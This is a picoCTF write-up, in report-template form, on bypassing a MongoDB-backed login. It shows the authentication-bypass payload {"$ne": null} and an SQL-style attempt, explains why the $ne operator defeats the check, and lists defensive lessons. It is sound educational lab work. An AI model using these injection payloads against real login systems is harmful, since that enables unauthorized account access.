# CTF Challenge Report Template

## Challenge Information

| Field              | Value                                               |
| ------------------ | --------------------------------------------------- |
| **Platform**       | picoCTF                                             |
| **Challenge Name** | NoSQL Injection                                     |
| **Category**       | Web Exploitation / Injection                        |
| **Difficulty**     | Easy                                                |
| **Points**         | [none]                                              |
| **Author**         | picoCTF Team                                        |
| **Date Completed** | 2025-09-01                                          |

## Objective

A login form was discovered on a web application hosted as part of the challenge. The app uses a NoSQL database (likely MongoDB) to store and query credentials. The goal was to bypass login using a NoSQL injection technique and retrieve the flag.

## Initial Reconnaissance

### Target Information

- **URL/IP**: picoCTF challenge web interface
- **Ports**: HTTP/HTTPS
- **Services**: Web application with login form

### Tools Used

- Firefox + DevTools  
- Burp Suite (optional)  
- Basic browser and form inspection  
- Manual payload crafting

### Commands/Steps

```bash
# Access challenge web interface
# Inspect login form elements
```

## Methodology

### Step 1: Form Analysis and Reconnaissance

Accessed the challenge web interface from the picoCTF platform and observed a login page with `username` and `password` fields. Attempted normal credentials but failed, then guessed that the backend might be using **MongoDB** due to the challenge category.

**Command/Code:**
```bash
# Browser inspection of login form
# Attempted normal credentials: admin/admin, admin/password, etc.
```

**Output:**
```
Login failed with normal credentials
Form accepts various input formats
```

### Step 2: NoSQL Injection Payload Testing

Tried known **NoSQL injection payloads** in the input fields to bypass authentication.

**Command/Code:**
```javascript
// Payload 1: SQL-like injection
Username: admin' || 1==1 //

// Payload 2: NoSQL specific
Username: admin
Password: {"$ne": null}
```

**Output:**
```
Payload 1: Failed
Payload 2: Success - Authentication bypassed
```

### Step 3: Authentication Bypass

Successfully bypassed authentication using NoSQL injection technique.

**Command/Code:**
```plaintext
Username: admin
Password: {"$ne": null}
```

**Output:**
```
Login successful!
Flag: picoCTF{***REDACTED***}
```

### Final Answer

```
picoCTF{***REDACTED***}
```

### Complete Walkthrough

Successfully bypassed the login form using NoSQL injection by providing `{"$ne": null}` as the password. This payload works because `"$ne"` is the MongoDB operator for "not equal", and by providing `{"$ne": null}`, we trick the query to match any non-null password, effectively bypassing authentication.

## Key Learnings

- NoSQL injections don't require quotes or SQL syntax — they often use JSON-like structure
- Always sanitize user input, even in NoSQL databases
- MongoDB's query structure can be exploited using logical operators like `$ne`, `$gt`, `$regex`, etc.
- Authentication bypass is one of the easiest ways to demonstrate impactful vulnerabilities in CTFs

## Tools and Resources

### Tools Used

- **Firefox + DevTools**: For web application inspection
- **Burp Suite**: For HTTP request manipulation (optional)
- **Browser**: For form interaction and payload testing

### References

- [OWASP NoSQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html)
- [MongoDB Security Best Practices](https://docs.mongodb.com/manual/security/)
- [picoCTF NoSQL Injection Challenge](https://play.picoctf.org/practice/challenge/nosql-injection)
- [NoSQL Injection Techniques](https://owasp.org/www-community/attacks/NoSQL_Injection)

## Tags

`#picoctf` `#web-exploitation` `#easy` `#nosql-injection` `#mongodb`
